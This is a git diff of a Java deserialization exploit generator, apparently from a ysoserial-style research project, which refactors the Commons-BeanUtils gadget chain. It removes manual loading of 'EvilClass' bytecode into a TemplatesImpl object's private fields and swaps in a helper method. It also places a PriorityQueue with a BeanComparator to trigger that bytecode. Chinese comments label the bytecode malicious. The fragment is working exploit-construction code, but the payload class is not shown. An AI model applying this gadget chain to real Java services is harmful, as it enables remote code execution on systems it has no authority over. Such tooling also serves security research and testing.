@@ -4,7 +4,6 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.apache.commons.beanutils.BeanComparator;
 import org.su18.serialize.yoserial.Utils.SerializeUtil;
 
-import java.io.InputStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.util.Comparator;
@@ -19,25 +18,13 @@ public class CommonBeanUtils {
 
 	public static void main(String[] args) throws Exception {
 
-		// 读取恶意类 bytes[]
-		InputStream inputStream = CommonBeanUtils.class.getResourceAsStream("../../test/EvilClass.class");
-		byte[]      bytes       = new byte[inputStream.available()];
-		inputStream.read(bytes);
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
 
 		// 初始化 PriorityQueue
 		PriorityQueue<Object> queue = new PriorityQueue<>(2);
 		queue.add("1");
 		queue.add("2");
-
-		// 初始化 TemplatesImpl 对象
-		TemplatesImpl tmpl      = new TemplatesImpl();
-		Field         bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
-		bytecodes.setAccessible(true);
-		bytecodes.set(tmpl, new byte[][]{bytes});
-		// _name 不能为空
-		Field name = TemplatesImpl.class.getDeclaredField("_name");
-		name.setAccessible(true);
-		name.set(tmpl, "su18");
 
 		// 反射将 TemplatesImpl 放在 PriorityQueue 里
 		Field field = PriorityQueue.class.getDeclaredField("queue");
